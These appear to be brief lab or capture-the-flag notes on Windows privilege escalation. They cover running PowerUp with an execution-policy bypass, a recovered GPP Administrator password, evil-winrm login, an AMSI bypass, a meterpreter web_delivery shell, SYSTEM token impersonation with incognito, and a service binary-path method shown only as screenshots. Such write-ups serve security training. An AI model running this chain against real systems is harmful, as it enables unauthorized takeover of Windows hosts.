# Enumeration
---
- Upload the `PowerUp.ps1`file and run `Invoke-AllChecks`:
	- `powershell -ep bypass`
	- `. .\PowerUp.ps1`
	- `Invoke-AllChecks`
- Saved **GPP credentials** for `Administrator`:
- ![[Pasted image 20250422160305.png]]
- `Administrator : MyUnclesAreMarioAndLuigi!!1!`

# Login using `evil-winrm`:
---
![[Pasted image 20250422160422.png]]

# Getting System
---
- We can bypass `AMSI`using `Evil-winrm`:
	- `Bypass-4MSI`
	- ![[Pasted image 20250422160601.png]]
- Gain `meterpreter`shell using `web_delivery`:
	- ![[Pasted image 20250422160634.png]]
	- ![[Pasted image 20250422160712.png]]
- Load `incognito`and impersonate `NT AUTHORITY\SYSTEM`:
	- `load incognito`
	- `list_tokens -u`
	- `impersonate_token "NT AUTHORITY\\SYSTEM"`
		- ![[Pasted image 20250422160857.png]]


# Vulnerable Service - Method 2
---
- Binary Path Exploitation
![[Pasted image 20250423161053.png]]
![[Pasted image 20250423161125.png]]
![[Pasted image 20250423161153.png]]